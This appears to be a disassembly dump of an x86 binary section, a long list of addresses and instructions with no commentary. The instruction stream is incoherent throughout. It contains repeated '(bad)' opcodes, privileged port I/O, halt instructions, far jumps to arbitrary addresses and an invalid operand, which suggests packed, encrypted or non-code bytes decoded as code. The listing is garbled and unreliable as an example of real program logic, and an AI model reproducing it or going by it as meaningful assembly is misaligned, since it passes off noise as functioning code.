  40e03e:	sbb    ecx,DWORD PTR [edi-0xa]
  40e041:	retf   
  40e042:	stos   DWORD PTR es:[edi],eax
  40e043:	pop    ss
  40e044:	call   0x5b17:0x974f9700
  40e04b:	jo     0x40e01f
  40e04d:	les    esp,FWORD PTR [edx+edi*8]
  40e050:	dec    edi
  40e051:	push   ebx
  40e052:	jbe    0x40e020
  40e054:	mov    ebx,0x39365db
  40e059:	add    al,ah
  40e05b:	and    bh,BYTE PTR [ecx]
  40e05d:	dec    BYTE PTR [eax+0x1abbd9fb]
  40e063:	sbb    al,0x5d
  40e065:	jns    0x40e0ae
  40e067:	loop   0x40e067
  40e069:	je     0x40e042
  40e06b:	pusha  
  40e06c:	fldenv [ebx+ecx*2]
  40e06f:	bound  ecx,QWORD PTR [esi-0x69a1115c]
  40e075:	cli    
  40e076:	scas   eax,DWORD PTR es:[edi]
  40e077:	in     al,dx
  40e078:	pop    es
  40e079:	(bad)  
  40e07b:	dec    esi
  40e07c:	cmp    bl,BYTE PTR [ebx-0x6]
  40e07f:	in     al,dx
  40e080:	enter  0xc35c,0x9d
  40e084:	pusha  
  40e085:	mov    ds:0xe2050b3d,eax
  40e08a:	lock adc esi,DWORD PTR [eax]
  40e08d:	fimul  WORD PTR [ebx+0x26077f8d]
  40e093:	leave  
  40e094:	int    0x5a
  40e096:	cmp    DWORD PTR [edx-0x1638bc80],edi
  40e09c:	call   0x19ec82d0
  40e0a1:	aad    0xf4
  40e0a3:	je     0x40e0b6
  40e0a5:	adc    DWORD PTR [esi-0x39],esi
  40e0a8:	cdq    
  40e0a9:	inc    eax
  40e0aa:	xor    al,0x3a
  40e0ac:	push   esi
  40e0ad:	cmc    
  40e0ae:	push   esp
  40e0af:	scas   al,BYTE PTR es:[edi]
  40e0b0:	and    al,0xfe
  40e0b2:	ret    
  40e0b3:	(bad)  
  40e0b4:	mov    WORD PTR [ebp-0x70],gs
  40e0b7:	mov    ds:0xd751e0a9,eax
  40e0bc:	test   al,0xf4
  40e0be:	sbb    esp,DWORD PTR [esi*1+0x1c8d3ae8]
  40e0c5:	mov    edi,0xe10188dc
  40e0ca:	adc    al,0xd3
  40e0cc:	adc    DWORD PTR [ecx],eax
  40e0ce:	mov    BYTE PTR [ebp+0x3e],ah
  40e0d1:	adc    dl,BYTE PTR [esi+0x173bdbae]
  40e0d7:	popa   
  40e0d8:	into   
  40e0d9:	mov    ds:0x5059f81,al
  40e0de:	test   BYTE PTR [edi+0x71f12fb6],ch
  40e0e4:	gs jns 0x40e116
  40e0e7:	icebp  
  40e0e8:	and    eax,0x92afeaf0
  40e0ed:	loop   0x40e0f5
  40e0ef:	js     0x40e16c
  40e0f1:	cmp    DWORD PTR [eax-0x6f],edi
  40e0f4:	cmp    al,0x8b
  40e0f6:	mov    al,ds:0xc727b3e
  40e0fb:	outs   dx,DWORD PTR ds:[esi]
  40e0fc:	sub    al,0x5b
  40e0fe:	sub    ecx,DWORD PTR [esi-0x38]
  40e101:	add    BYTE PTR [edx-0x25f39929],0x4a
  40e108:	xchg   ebx,eax
  40e109:	sub    eax,0x4cecb475
  40e10e:	jbe    0x40e0df
  40e110:	mov    bl,0xa0
  40e112:	xor    al,0x7a
  40e114:	xlat   BYTE PTR ds:[ebx]
  40e115:	je     0x40e143
  40e117:	jae    0x40e0d2
  40e119:	xor    BYTE PTR [edi+0x68],ch
  40e11c:	mov    WORD PTR [edi+0x17],gs
  40e11f:	jecxz  0x40e0bf
  40e121:	sbb    al,0x1d
  40e123:	adc    eax,0x87bc2dbf
  40e128:	scas   al,BYTE PTR es:[edi]
  40e129:	rol    BYTE PTR [eax],0x49
  40e12c:	popa   
  40e12d:	int    0xa3
  40e12f:	es cwde 
  40e131:	mov    ds:0x284b0f51,al
  40e136:	xor    DWORD PTR [esi-0x135e12c2],edx
  40e13c:	xor    eax,0x302f3de6
  40e141:	shl    DWORD PTR [ebp+0x4302f19c],cl
  40e147:	dec    edi
  40e148:	imul   BYTE PTR [edx-0x70]
  40e14b:	sar    BYTE PTR [eax+0x6],1
  40e14e:	mov    esp,0x8fece390
  40e153:	cmp    BYTE PTR [eiz*8-0x1227ec95],bh
  40e15a:	inc    edi
  40e15b:	das    
  40e15c:	popa   
  40e15d:	inc    ebx
  40e15e:	jmp    0x40e166
  40e160:	and    BYTE PTR [ebx+0x1d],dh
  40e163:	scas   eax,DWORD PTR es:[edi]
  40e164:	aas    
  40e165:	mov    al,ds:0x8ea60b7
  40e16a:	std    
  40e16b:	jle    0x40e102
  40e16d:	sbb    DWORD PTR [ecx-0x54],ecx
  40e170:	call   0xa3f236bd
  40e175:	jge    0x40e161
  40e177:	call   0x3f95:0x88518a6e
  40e17e:	sar    DWORD PTR [esi],cl
  40e180:	inc    edx
  40e181:	call   0x576a:0x83ac1eb2
  40e188:	mov    ebp,0xe1259fec
  40e18d:	ins    BYTE PTR es:[edi],dx
  40e18e:	inc    esp
  40e18f:	xor    ebp,DWORD PTR [esi]
  40e191:	mov    ds:0x284c3ff8,al
  40e196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e197:	inc    esp
  40e198:	dec    edi
  40e199:	shl    DWORD PTR [eax+0x12],0x2a
  40e19d:	or     edx,esp
  40e19f:	ins    BYTE PTR es:[edi],dx
  40e1a0:	jl     0x40e16a
  40e1a2:	fadd   DWORD PTR [ecx]
  40e1a4:	mov    ds:0xa246975f,eax
  40e1a9:	cdq    
  40e1aa:	out    dx,eax
  40e1ab:	ja     0x40e1e9
  40e1ad:	outs   dx,BYTE PTR ds:[esi]
  40e1ae:	sub    eax,0x66c15e3
  40e1b3:	ret    0xc7ac
  40e1b6:	rol    DWORD PTR [ebx-0x7d7d5ed4],1
  40e1bc:	adc    edi,eax
  40e1be:	inc    edi
  40e1bf:	hlt    
  40e1c0:	xor    al,0x4d
  40e1c2:	add    al,0x94
  40e1c4:	lahf   
  40e1c5:	fidiv  WORD PTR [bx+si]
  40e1c8:	push   cs
  40e1c9:	fimul  WORD PTR [edi+0x609f20f1]
  40e1cf:	ja     0x40e1c7
  40e1d1:	daa    
  40e1d2:	xor    eax,0x900973ad
  40e1d7:	out    0x9c,al
  40e1d9:	les    eax,FWORD PTR [ecx+eiz*8+0x2f]
  40e1dd:	mov    ebx,0x114861a0
  40e1e2:	pop    ds
  40e1e3:	aad    0xb8
  40e1e5:	(bad)  
  40e1e6:	ficomp DWORD PTR [esi-0x76514816]
  40e1ec:	inc    edi
  40e1ed:	inc    ebp
  40e1ee:	arpl   di,bp
  40e1f0:	aam    0x75
  40e1f2:	push   es
  40e1f3:	jmp    0x33bd:0x326bc14b
  40e1fa:	lea    ebx,[ebx+0x55f74af4]
  40e200:	pop    DWORD PTR [edx+ecx*8-0x4c57fbdb]
  40e207:	inc    edi
  40e208:	push   ebx
  40e209:	sub    al,0x42
  40e20b:	inc    ebx
  40e20c:	bound  ecx,QWORD PTR [edx]
  40e20e:	(bad)  
  40e20f:	xchg   ecx,eax
  40e210:	retf   
  40e211:	and    dh,BYTE PTR [bx+di+0x7d7f]
  40e216:	pushf  
  40e217:	aas    
  40e218:	add    ah,0xbe
  40e21b:	stos   BYTE PTR es:[edi],al
  40e21c:	fiadd  WORD PTR [eax-0x3c03484c]
  40e222:	jne    0x40e210
  40e224:	mov    eax,ds:0xe5bec585
  40e229:	add    ch,BYTE PTR [ecx+0xb]
  40e22c:	(bad)  
  40e22d:	jae    0x40e270
  40e22f:	loope  0x40e24f
  40e231:	xor    al,0x50
  40e233:	xchg   DWORD PTR [edx+0x695f7d3c],edi
  40e239:	jmp    0x4c58:0x90dd0a20
  40e240:	(bad)  
  40e241:	push   cs
  40e242:	lahf   
  40e243:	daa    
  40e244:	pop    ebx
  40e245:	mov    ch,0xb2
  40e247:	cs sbb al,0x21
  40e24a:	out    dx,eax
  40e24b:	pusha  
  40e24c:	jge    0x40e2b7
  40e24e:	jbe    0x40e274
  40e250:	nop
  40e251:	inc    ecx
  40e252:	std    
  40e253:	fwait
  40e254:	xor    BYTE PTR [edx],ah
  40e256:	add    esp,DWORD PTR [ebx]
  40e258:	and    al,0x0
  40e25a:	shr    DWORD PTR [eax+eiz*2+0x5a],0x41
  40e25f:	mov    al,ds:0x1dd2cdd5
  40e264:	push   ebx
  40e265:	xchg   esp,eax
  40e266:	div    cl
  40e268:	fs enter 0x3512,0xde
  40e26d:	scas   al,BYTE PTR es:[edi]
  40e26e:	test   BYTE PTR [edx],al
  40e270:	pop    ebp
  40e271:	dec    edi
  40e272:	xor    DWORD PTR [edi+ebp*1-0x3caff800],edi
  40e279:	aam    0x9f
  40e27b:	sbb    eax,0xbad4ebda
  40e280:	jge    0x40e283
  40e282:	aad    0xe9
  40e284:	xor    edx,DWORD PTR ds:0xe7373528
  40e28a:	mov    ebx,0x374d8c5c
  40e28f:	aas    
  40e290:	aad    0x1c
  40e292:	pop    ebp
  40e293:	rcr    BYTE PTR [edi+0x7b],0xe1
  40e297:	mov    cl,0x2a
  40e299:	push   ds
  40e29a:	pop    DWORD PTR [esi]
  40e29c:	rcl    eax,1
  40e29e:	mov    esp,0xe12a9060
  40e2a3:	jge    0x40e273
  40e2a5:	icebp  
  40e2a6:	xchg   ecx,eax
  40e2a7:	aaa    
  40e2a8:	adc    edx,ecx
  40e2aa:	push   eax
  40e2ab:	xchg   edx,eax
  40e2ac:	inc    ecx
  40e2ad:	xor    ebx,eax
  40e2af:	iret   
  40e2b0:	test   eax,0xbf597c2c
  40e2b5:	inc    esi
  40e2b6:	fmul   st(5),st
  40e2b8:	sub    al,0x43
  40e2ba:	or     eax,0x74bac61c
  40e2bf:	mov    esi,DWORD PTR [edi-0x46]
  40e2c2:	push   ebp
  40e2c3:	das    
  40e2c4:	xor    edx,DWORD PTR [esi]
  40e2c6:	or     DWORD PTR [ebp+0x5cbbaac4],ebx
  40e2cc:	xchg   ebx,eax
  40e2cd:	pusha  
  40e2ce:	mov    eax,0xe4f38355
  40e2d3:	dec    ecx
  40e2d4:	xlat   BYTE PTR ds:[ebx]
  40e2d5:	out    0x93,eax
  40e2d7:	sub    BYTE PTR [esp+ecx*1+0x35],bl
  40e2db:	mov    ebp,0x6867f0c4
  40e2e0:	in     eax,dx
  40e2e1:	xor    eax,0xf23d504e
  40e2e6:	jae    0x40e2a2
  40e2e8:	mov    cl,0x75
  40e2ea:	inc    edx
  40e2eb:	or     al,0x20
  40e2ed:	mov    edi,0xac8bc946
  40e2f2:	cmp    bl,BYTE PTR [ebx]
  40e2f4:	add    eax,DWORD PTR [esi+0x3d]
  40e2f7:	clc    
  40e2f8:	jmp    0x4861:0x625bcbf5
  40e2ff:	jge    0x40e2dc
  40e301:	leave  
  40e302:	push   cs
  40e303:	xchg   ebp,eax
  40e304:	sbb    dh,dh
  40e306:	push   edx
  40e307:	aad    0x16
  40e309:	lods   al,BYTE PTR ds:[esi]
  40e30a:	push   ebx
  40e30b:	sub    DWORD PTR [ebp-0x75dbcadf],esi
  40e311:	cs retf 0x2cf3
  40e315:	jno    0x40e371
  40e317:	add    BYTE PTR [esp+ebp*2-0x7c],al
  40e31b:	pop    ebx
  40e31c:	call   0xe581:0x27b91133
  40e323:	push   edx
  40e324:	push   esp
  40e325:	das    
  40e326:	ficomp DWORD PTR [ebx+eiz*8-0x4fd7e243]
  40e32d:	sbb    BYTE PTR [ecx+0x4d],bl
  40e330:	std    
  40e331:	xor    al,0x66
  40e333:	dec    ebx
  40e334:	test   al,0xb1
  40e336:	cmp    BYTE PTR [eax+esi*2-0x7],cl
  40e33a:	inc    edi
  40e33b:	das    
  40e33c:	stos   DWORD PTR es:[edi],eax
  40e33d:	dec    ebx
  40e33e:	add    edx,DWORD PTR [esi+0x7e]
  40e341:	xor    dh,BYTE PTR [ecx+0x7d]
  40e344:	or     cl,BYTE PTR [ebp+0x71]
  40e347:	(bad)  
  40e348:	dec    esi
  40e349:	int    0x70
  40e34b:	nop    DWORD PTR [edi]
  40e34e:	fimul  WORD PTR [edi-0x29]
  40e351:	lea    edx,ds:0x91ad57e6
  40e357:	test   DWORD PTR [eax+ecx*1],esi
  40e35a:	aaa    
  40e35b:	jne    0x40e39e
  40e35d:	fnsave ds:0x3c5c4c87
  40e363:	xchg   ebx,eax
  40e364:	xchg   ebx,eax
  40e365:	pop    edi
  40e366:	xor    eax,0xe4d9388
  40e36b:	out    0xf7,eax
  40e36d:	outs   dx,BYTE PTR ds:[esi]
  40e36e:	xor    BYTE PTR [ebx-0x77f6e735],0x18
  40e375:	lods   eax,DWORD PTR ds:[esi]
  40e376:	inc    edx
  40e377:	test   al,0x95
  40e379:	mov    ebp,edx
  40e37b:	push   0x51
  40e37d:	(bad)  
  40e37e:	fsubr  DWORD PTR [esi-0x63497251]
  40e384:	pop    edx
  40e385:	pop    edx
  40e386:	(bad)  
  40e388:	and    esp,eax
  40e38a:	jns    0x40e373
  40e38c:	loope  0x40e383
  40e38e:	inc    ecx
  40e38f:	ins    DWORD PTR es:[edi],dx
  40e390:	test   BYTE PTR ds:0x5298da47,al
  40e396:	bound  esi,QWORD PTR [ebx]
  40e398:	push   0xfffffff4
  40e39a:	jo     0x40e3b8
  40e39c:	clc    
  40e39d:	pop    ecx
  40e39e:	jmp    0x40e3b8
  40e3a0:	dec    ecx
  40e3a1:	or     eax,0x947f4f08
  40e3a6:	mov    eax,ds:0xc21938c5
  40e3ab:	fidivr WORD PTR [ecx-0x3c9aae4c]
  40e3b1:	dec    esp
  40e3b2:	rol    BYTE PTR [esi-0x27],cl
  40e3b5:	pop    eax
  40e3b6:	scas   eax,DWORD PTR es:[edi]
  40e3b7:	jecxz  0x40e379
  40e3b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3ba:	dec    ebp
  40e3bb:	(bad)  
  40e3bc:	stos   BYTE PTR es:[edi],al
  40e3bd:	scas   al,BYTE PTR es:[edi]
  40e3be:	ficomp WORD PTR [ebx+0x65]
  40e3c1:	or     ch,BYTE PTR [edx+0x47]
  40e3c4:	dec    esi
  40e3c5:	cdq    
  40e3c6:	jns    0x40e415
  40e3c8:	dec    edx
  40e3c9:	pop    ebp
  40e3ca:	shl    BYTE PTR [edi+0x306c5c0e],1
  40e3d0:	mov    ebp,0x339d520e
  40e3d5:	ja     0x40e382
  40e3d7:	push   esp
  40e3d8:	ror    BYTE PTR [eax-0x12bf3ddb],1
  40e3de:	jg     0x40e3d6
  40e3e0:	dec    edi
  40e3e1:	in     eax,dx
  40e3e2:	inc    eax
  40e3e3:	sahf   
  40e3e4:	(bad)  
  40e3e5:	repz dec al
  40e3e8:	das    
  40e3e9:	dec    ebx
  40e3ea:	adc    BYTE PTR [ebx+0x56],ch
  40e3ed:	sbb    al,0x37
  40e3ef:	adc    ecx,DWORD PTR [eax+0x2517b6aa]
  40e3f5:	sub    al,0x1d
  40e3f7:	out    0x33,eax
  40e3f9:	test   DWORD PTR [esp+esi*1],esp
  40e3fc:	mov    esi,0xf28515cc
  40e401:	pop    ds
  40e402:	jmp    0x40e428
  40e404:	aaa    
  40e405:	mov    esi,0xba2eb8ea
  40e40a:	mov    esp,0xdca66df5
  40e40f:	(bad)  
  40e410:	fdiv   st,st(1)
  40e412:	test   eax,edi
  40e414:	jg     0x40e43a
  40e416:	cmp    ah,BYTE PTR [edi]
  40e418:	jp     0x40e48c
  40e41a:	add    eax,0x9d2dbf21
  40e41f:	or     DWORD PTR [ebx],edi
  40e421:	outs   dx,BYTE PTR ds:[esi]
  40e422:	xchg   ebx,eax
  40e423:	in     eax,0x38
  40e425:	fwait
  40e426:	stc    
  40e427:	pop    ds
  40e428:	out    dx,al
  40e429:	lods   al,BYTE PTR ds:[esi]
  40e42a:	or     ah,ch
  40e42c:	xchg   edi,eax
  40e42d:	mov    al,0x95
  40e42f:	push   ss
  40e430:	outs   dx,BYTE PTR ds:[esi]
  40e431:	in     al,dx
  40e432:	jmp    0x384e:0xab0b6cca
  40e439:	or     ah,0x42
  40e43c:	push   ecx
  40e43d:	hlt    
  40e43e:	fidivr WORD PTR [edx+0x2e502090]
  40e444:	add    al,0xf0
  40e446:	xchg   DWORD PTR [esi],esi
  40e448:	rol    DWORD PTR [ebp-0x1d6a8a5e],0xef
  40e44f:	(bad)  
  40e450:	imul   esp,DWORD PTR [ecx+0x2a],0x4f
  40e454:	inc    eax
  40e455:	and    al,0xed
  40e457:	mov    BYTE PTR [ecx+0x4a5be5ec],bl
  40e45d:	and    BYTE PTR [eax-0x18668da5],cl
  40e463:	adc    eax,0xdedde95d
  40e468:	pop    ebp
  40e469:	fadd   QWORD PTR [ecx]
  40e46b:	(bad)  
  40e46c:	iret   
  40e46d:	shl    BYTE PTR [ecx+ecx*8],cl
  40e470:	cmp    BYTE PTR [ecx-0x793c7b13],0x68
  40e477:	ficom  WORD PTR [edi+0x71]
  40e47a:	cmp    ebp,DWORD PTR [ebx-0x3632f30f]
  40e480:	(bad)  
  40e481:	(bad)  
  40e483:	xchg   dh,ch
  40e485:	jo     0x40e448
  40e487:	xor    al,0x5a
  40e489:	mov    al,0x70
  40e48b:	in     al,dx
  40e48c:	mov    bh,0xca
  40e48e:	and    bl,BYTE PTR [ebp+0x9f108c]
  40e494:	push   cs
  40e495:	sbb    BYTE PTR [edi+esi*8-0x5e0a5204],0xd8
  40e49d:	cmp    BYTE PTR ds:0xd0f6d1,al
  40e4a3:	adc    al,bl
  40e4a5:	and    dl,al
  40e4a7:	fild   QWORD PTR [edx-0x344a4fdb]
  40e4ad:	lds    edx,FWORD PTR [ecx-0x3b]
  40e4b0:	sub    eax,DWORD PTR [ebx]
  40e4b2:	or     esp,edx
  40e4b4:	call   0xed80:0x6fb6862c
  40e4bb:	xor    BYTE PTR [edi],bh
  40e4bd:	retf   0x940b
  40e4c0:	add    edi,DWORD PTR [eax-0x6bb6f7ac]
  40e4c6:	loope  0x40e53a
  40e4c8:	add    edi,0x7c0f14d0
  40e4ce:	jnp    0x40e467
  40e4d0:	nop
  40e4d1:	sahf   
  40e4d2:	xchg   BYTE PTR [ecx+0x4f],dl
  40e4d5:	inc    edx
  40e4d6:	in     eax,0xba
  40e4d8:	das    
  40e4d9:	fisttp DWORD PTR [eax+edi*2+0x6a50d1e1]
  40e4e0:	inc    ecx
  40e4e1:	mov    edx,0xbf7dcf35
  40e4e6:	in     al,dx
  40e4e7:	dec    edx
  40e4e8:	jno    0x40e4e5
  40e4ea:	mov    esi,0xd7e93347
  40e4ef:	or     al,0x3f
  40e4f1:	add    cl,BYTE PTR [esi-0x6d]
  40e4f4:	mov    dh,0xb5
  40e4f6:	gs out 0x56,eax
  40e4f9:	in     al,dx
  40e4fa:	pop    ss
  40e4fb:	mov    eax,ds:0xe9651a01
  40e500:	xchg   esp,eax
  40e501:	push   esp
  40e502:	and    DWORD PTR [ebx],edi
  40e504:	stc    
  40e505:	push   esi
  40e506:	adc    BYTE PTR [eax],ch
  40e508:	shl    DWORD PTR [edx],1
  40e50a:	adc    al,0x54
  40e50c:	add    eax,0xb9c258bb
  40e511:	ins    DWORD PTR es:[edi],dx
  40e512:	mov    BYTE PTR [ebx+0x27],dl
  40e515:	add    bh,BYTE PTR [esi]
  40e517:	mov    dh,0x95
  40e519:	xchg   ecx,eax
  40e51a:	arpl   WORD PTR [edi],bx
  40e51c:	and    edi,DWORD PTR [eax]
  40e51e:	jge    0x40e541
  40e520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e521:	push   0xcc72c56
  40e526:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e527:	xchg   esi,esi
  40e529:	ins    DWORD PTR es:[edi],dx
  40e52a:	inc    ebp
  40e52b:	lea    ebp,[ecx-0x5f]
  40e52e:	mov    dh,0x1c
  40e530:	jl     0x40e4e4
  40e532:	dec    ebp
  40e533:	xchg   al,cl
  40e535:	int    0xba
  40e537:	scas   eax,DWORD PTR es:[edi]
  40e538:	rol    bh,cl
  40e53a:	mov    ebp,0x1637c764
  40e53f:	push   ebp
  40e540:	push   0x4267483b
  40e545:	and    edi,DWORD PTR [esi]
  40e547:	stc    
  40e548:	add    bl,ah
  40e54a:	cmc    
  40e54b:	pop    ecx
  40e54c:	imul   edx,DWORD PTR [ecx],0x1089b9da
  40e552:	in     al,dx
  40e553:	inc    esi
  40e554:	out    0x95,al
  40e556:	jns    0x40e501
  40e558:	fs daa 
  40e55a:	jl     0x40e57b
  40e55c:	xchg   DWORD PTR [ebx-0x70],edi
  40e55f:	jo     0x40e53c
  40e561:	xor    eax,0xfe7dad2f
  40e566:	test   al,0x10
  40e568:	push   ebp
  40e569:	pop    ds
  40e56a:	imul   eax,DWORD PTR [edi],0x6c
  40e56d:	in     al,0x63
  40e56f:	push   cs
  40e570:	fcom   DWORD PTR ds:0xfa9f4cfd
  40e576:	js     0x40e533
  40e578:	jecxz  0x40e57b
  40e57a:	int    0x37
  40e57c:	test   al,0x7d
  40e57e:	outs   dx,DWORD PTR ds:[esi]
  40e57f:	fwait
  40e580:	call   0x47240d2f
  40e585:	sar    DWORD PTR [ebp+0x591677bf],cl
  40e58b:	int    0xe9
  40e58d:	cmp    DWORD PTR [esi],0xe71e7fc8
  40e593:	test   BYTE PTR [edx-0x14],bh
  40e596:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e597:	loopne 0x40e5da
  40e599:	inc    edx
  40e59a:	or     DWORD PTR [ebx+0x51daaa4c],0x8bb8275a
  40e5a4:	mul    al
  40e5a6:	ret    
  40e5a7:	bound  edi,QWORD PTR [ecx]
  40e5a9:	stc    
  40e5aa:	sbb    al,0xb5
  40e5ac:	mov    esi,0x67baa41f
  40e5b1:	test   al,0x63
  40e5b3:	outs   dx,BYTE PTR ds:[esi]
  40e5b4:	(bad)  
  40e5b5:	cmc    
  40e5b6:	je     0x40e55b
  40e5b8:	jb     0x40e5cd
  40e5ba:	mov    bl,0x54
  40e5bc:	test   DWORD PTR [ebx],0x4f82b388
  40e5c2:	jmp    0xfa74e17c
  40e5c7:	jne    0x40e5fb
  40e5c9:	and    DWORD PTR [esi+ebp*8+0xb63936f],esi
  40e5d0:	xchg   esi,eax
  40e5d1:	ja     0x40e5ad
  40e5d3:	loope  0x40e600
  40e5d5:	jae    0x40e59a
  40e5d7:	int    0x7c
  40e5d9:	push   esp
  40e5da:	mov    ch,0xcf
  40e5dc:	clc    
  40e5dd:	mov    eax,ds:0x28573526
  40e5e2:	add    eax,ebx
  40e5e4:	dec    esi
  40e5e5:	xor    BYTE PTR [ebx+0x2e9717d6],al
  40e5eb:	sub    ah,ch
  40e5ed:	retf   
  40e5ee:	and    eax,DWORD PTR [esi]
  40e5f0:	es stos BYTE PTR es:[edi],al
  40e5f2:	mov    dl,dh
  40e5f4:	sbb    eax,0x7e52e7ea
  40e5f9:	jp     0x40e675
  40e5fb:	push   ebx
  40e5fc:	cmp    ah,BYTE PTR [edi-0x5f]
  40e5ff:	adc    al,0x5a
  40e601:	cmp    ch,cl
  40e603:	push   ss
  40e604:	shr    dh,1
  40e606:	dec    edi
  40e607:	retf   
  40e608:	retf   0x1c4c
  40e60b:	sub    ah,BYTE PTR [edi+0x10]
  40e60e:	into   
  40e60f:	in     eax,dx
  40e610:	mov    ds,WORD PTR [edx-0x2c]
  40e613:	test   al,0xe9
  40e615:	xor    edi,DWORD PTR [eax]
  40e617:	or     eax,0x969cc741
  40e61c:	jnp    0x40e5b3
  40e61e:	adc    esi,esp
  40e620:	push   esi
  40e621:	je     0x40e67d
  40e623:	push   ebp
  40e624:	jmp    0xccbf:0x939195b7
  40e62b:	adc    ebp,DWORD PTR [esi]
  40e62d:	cs or  ebp,esp
  40e630:	shl    BYTE PTR [ebx+0x3848cb39],1
  40e636:	mov    al,0x84
  40e638:	repnz pusha 
  40e63a:	jp     0x40e5cb
  40e63c:	in     al,dx
  40e63d:	mov    bl,0xf6
  40e63f:	mov    ?,WORD PTR [esi-0x1a1be33]
  40e645:	leave  
  40e646:	pop    esi
  40e647:	je     0x40e698
  40e649:	add    bl,BYTE PTR es:[esi+0x28fbbe88]
  40e650:	imul   ebp,DWORD PTR [ecx],0xffffffc3
  40e653:	dec    ecx
  40e654:	xchg   BYTE PTR [edi-0x48],ah
  40e657:	aaa    
  40e658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e659:	in     al,0xd
  40e65b:	sahf   
  40e65c:	rcr    dl,0x7b
  40e65f:	pop    edi
  40e660:	jne    0x40e65c
  40e662:	mul    DWORD PTR [edi]
  40e664:	int3   
  40e665:	sbb    ecx,DWORD PTR ds:[ebx+0x69]
  40e669:	lods   al,BYTE PTR ds:[esi]
  40e66a:	xor    al,0x18
  40e66c:	mov    dl,0x41
  40e66e:	or     al,0x2
  40e670:	mov    ah,0x77
  40e672:	mov    es,WORD PTR [ecx]
  40e674:	xlat   BYTE PTR ds:[ebx]
  40e675:	adc    eax,0x47
  40e678:	aaa    
  40e679:	ss cwde 
  40e67b:	mov    ds:0x7ec9dd5,al
  40e680:	icebp  
  40e681:	mov    al,0xd9
  40e683:	add    DWORD PTR [ebx+0x72],edi
  40e686:	mov    ss,esi
  40e688:	ret    
  40e689:	out    0x95,eax
  40e68b:	in     eax,0xe8
  40e68d:	sub    edx,DWORD PTR [edx+0x3ae1982c]
  40e693:	js     0x40e6d0
  40e695:	jns    0x40e705
  40e697:	lock mov ebx,0x5a5e39fa
  40e69d:	aad    0x8b
  40e69f:	retf   0x63e8
  40e6a2:	or     eax,0xe8ccca6f
  40e6a7:	ja     0x40e6d0
  40e6a9:	mov    edi,0xc2ac4f08
  40e6ae:	retf   0x2e64
  40e6b1:	ja     0x40e719
  40e6b3:	or     al,0x5c
  40e6b5:	les    eax,FWORD PTR ds:0x3972e5e9
  40e6bb:	jne    0x40e64a
  40e6bd:	mov    ecx,0x1a3672ed
  40e6c2:	popf   
  40e6c3:	pusha  
  40e6c4:	aas    
  40e6c5:	jle    0x40e66b
  40e6c7:	adc    BYTE PTR [ecx],bl
  40e6c9:	dec    ecx
  40e6ca:	fimul  DWORD PTR [ebp-0x333d5389]
  40e6d0:	pop    es
  40e6d1:	std    
  40e6d2:	jmp    0x12cb4220
  40e6d7:	arpl   WORD PTR [ecx+0x42],ax
  40e6da:	inc    ecx
  40e6db:	jb     0x40e66e
  40e6dd:	je     0x40e72f
  40e6df:	xchg   esp,eax
  40e6e0:	and    dl,bl
  40e6e2:	and    esi,eax
  40e6e4:	cmp    bl,BYTE PTR [ebx+0x27af6dc4]
  40e6ea:	hlt    
  40e6eb:	hlt    
  40e6ec:	les    ebp,FWORD PTR [eax-0x63]
  40e6ef:	or     dl,BYTE PTR [ebp-0x6eb6e542]
  40e6f5:	cmp    ebp,DWORD PTR [edi]
  40e6f7:	popf   
  40e6f8:	and    BYTE PTR [ebx+0x24e84f29],bh
  40e6fe:	cmc    
  40e6ff:	or     ch,ah
  40e701:	pop    eax
  40e702:	mov    bl,0xd0
  40e704:	push   ds
  40e705:	adc    ah,0x0
  40e708:	dec    ecx
  40e709:	jbe    0x40e6e1
  40e70b:	or     BYTE PTR [edx+0xb2f137a],al
  40e711:	mov    ecx,0xd4ad6c7f
  40e716:	sub    BYTE PTR [ecx],ah
  40e718:	ds jne 0x40e6f5
  40e71b:	fs mov dl,0x49
  40e71e:	or     ecx,DWORD PTR [ebp+eax*4+0x57c97f6f]
  40e725:	loop   0x40e75b
  40e727:	or     esi,ebp
  40e729:	xchg   BYTE PTR [edi+0x26],dh
  40e72c:	fsubr  st(0),st
  40e72e:	arpl   WORD PTR es:[edx+ecx*1+0xb1425ba],bp
  40e736:	mov    WORD PTR [eax],gs
  40e738:	pop    es
  40e739:	dec    eax
  40e73a:	mov    eax,0x678680ff
  40e73f:	sbb    al,0xc3
  40e741:	push   cs
  40e742:	test   eax,0x700ed7e8
  40e747:	scas   al,BYTE PTR es:[edi]
  40e748:	mov    esi,0x874d54bf
  40e74d:	cli    
  40e74e:	(bad)  
  40e74f:	sti    
  40e750:	jbe    0x40e78d
  40e752:	pop    ebx
  40e753:	mov    cs,WORD PTR [ebp-0x2753e59f]
  40e759:	and    dl,dl
  40e75b:	lahf   
  40e75c:	pop    edx
  40e75d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e75e:	dec    edi
  40e75f:	jmp    0x825d63ea
  40e764:	pop    edi
  40e765:	je     0x40e7d5
  40e767:	outs   dx,DWORD PTR ds:[esi]
  40e768:	aaa    
  40e769:	push   ss
  40e76a:	or     eax,esi
  40e76c:	xchg   esi,eax
  40e76d:	and    dh,BYTE PTR [edx-0x4e]
  40e770:	not    DWORD PTR [esi+0x51]
  40e773:	push   ebp
  40e774:	xor    eax,0x54b89412
  40e779:	imul   edx,DWORD PTR [eax-0x42fedeca],0xffffff9f
  40e780:	inc    edx
  40e781:	sbb    ebp,ebx
  40e783:	or     esi,0x5e99821b
  40e789:	xor    BYTE PTR [esi-0x3eaeab88],0xe8
  40e790:	push   edx
  40e791:	adc    esi,DWORD PTR [eax-0x55]
  40e794:	enter  0x822c,0x58
  40e798:	inc    ebp
  40e799:	neg    DWORD PTR [eax-0x3b]
  40e79c:	push   edx
  40e79d:	lock int 0x14
  40e7a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7a1:	call   0x504b2927
  40e7a6:	jl     0x40e7c7
  40e7a8:	push   ebp
  40e7a9:	arpl   di,ax
  40e7ab:	xor    al,0x34
  40e7ad:	push   0x18
  40e7af:	cwde   
  40e7b0:	mov    bl,BYTE PTR [ebx+0x2a6a65b9]
  40e7b6:	lods   al,BYTE PTR ds:[esi]
  40e7b7:	xlat   BYTE PTR ds:[ebx]
  40e7b8:	loopne 0x40e77b
  40e7ba:	dec    ebx
  40e7bb:	cdq    
